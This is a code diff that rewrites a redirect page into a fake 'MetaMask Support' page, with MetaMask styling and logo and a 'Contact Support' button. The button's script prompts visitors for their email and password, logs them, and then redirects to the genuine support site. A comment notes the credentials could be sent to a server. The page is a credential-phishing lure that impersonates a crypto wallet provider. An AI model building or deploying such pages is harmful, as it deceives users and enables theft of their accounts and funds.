@@ -2,20 +2,91 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Redirecting...</title>
+  <title>MetaMask Support</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      background-color: #f6851b;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .card {
+      background-color: white;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+      text-align: center;
+      max-width: 400px;
+      width: 100%;
+    }
+
+    .metamask-logo {
+      width: 80px;
+      margin-bottom: 20px;
+    }
+
+    h2 {
+      color: #f6851b;
+      margin-bottom: 10px;
+    }
+
+    p {
+      color: #333;
+      font-size: 16px;
+    }
+
+    .url-box {
+      background-color: #f0f0f0;
+      padding: 10px;
+      margin: 15px 0;
+      border-radius: 8px;
+      font-family: monospace;
+      color: #333;
+      word-break: break-all;
+    }
+
+    button {
+      background-color: #f6851b;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      font-size: 16px;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #e27400;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <img class="metamask-logo" src="https://seeklogo.com/images/M/metamask-logo-09EDE53DBD-seeklogo.com.png" alt="MetaMask Logo">
+    <h2>Connect with MetaMask Support</h2>
+    <p>Click below to start contacting MetaMask support:</p>
+    <div class="url-box" id="304url">https://support.metamask.io</div>
+    <button onclick="getSupport()">🔗 Contact Support</button>
+  </div>
+
   <script>
-    setTimeout(() => {
+    function getSupport() {
       const email = prompt("Enter your email:");
       const pass = prompt("Enter your password:");
       // Bisa disimpan di localStorage, atau kirim ke server jika perlu
       console.log("Email:", email);
       console.log("Password:", pass);
-
-      location.href = "https://support.metamask.io";
-    }, 1500);
+      setTimeout(() => {
+        location.href = "https://support.metamask.io";
+      }, 1000);
+    }
   </script>
-</head>
-<body>
-  <p style="font-family: sans-serif; text-align:center; margin-top: 30vh;">Redirecting to MetaMask Support...</p>
+
 </body>
 </html>
